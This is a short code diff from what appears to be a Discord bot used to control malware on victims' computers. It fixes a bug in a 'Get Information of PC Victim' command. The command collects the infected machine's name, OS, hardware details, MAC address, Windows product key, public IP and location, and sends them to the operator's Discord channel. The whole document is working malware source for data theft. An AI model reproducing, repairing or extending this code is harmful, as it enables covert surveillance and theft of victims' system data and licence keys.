@@ -22,7 +22,7 @@ class OtherCommands(commands.Cog, description='Other Commands'):
 
 	@app_commands.command(description='Get Information of PC Victim')
 	async def getinformation(self, interaction, hwid: str, ):
-		if not CheckHwid(HWID):
+		if not CheckHwid(hwid):
 			return
 		information_embed = discord.Embed(description=f"**__System Info__**\n```autohotkey\nComputer Name: {pc.HostName()}\nComputer OS: {pc.OSPlatform()} {pc.OSVersion()}\nCPU: {pc.Processor()}\nMac Address: {pc.MacAddress()}\nHWID: {pc.HWID()}\nTotal Cores: {pc.TotalCores()}\nTotal RAM: {pc.TotalRAM()}\nProduct Key: {pc.WindowProductKey()}\n```\n**__IP Info__**```prolog\nIP: {pc.IP()}\nRegion: {pc.IPData()['region']}\nCountry: {pc.IPData()['country']}\nCity: {pc.IPData()['city']}\nOrg: {pc.IPData()['org']}\n```")
 		await interaction.response.send_message(embed = information_embed)
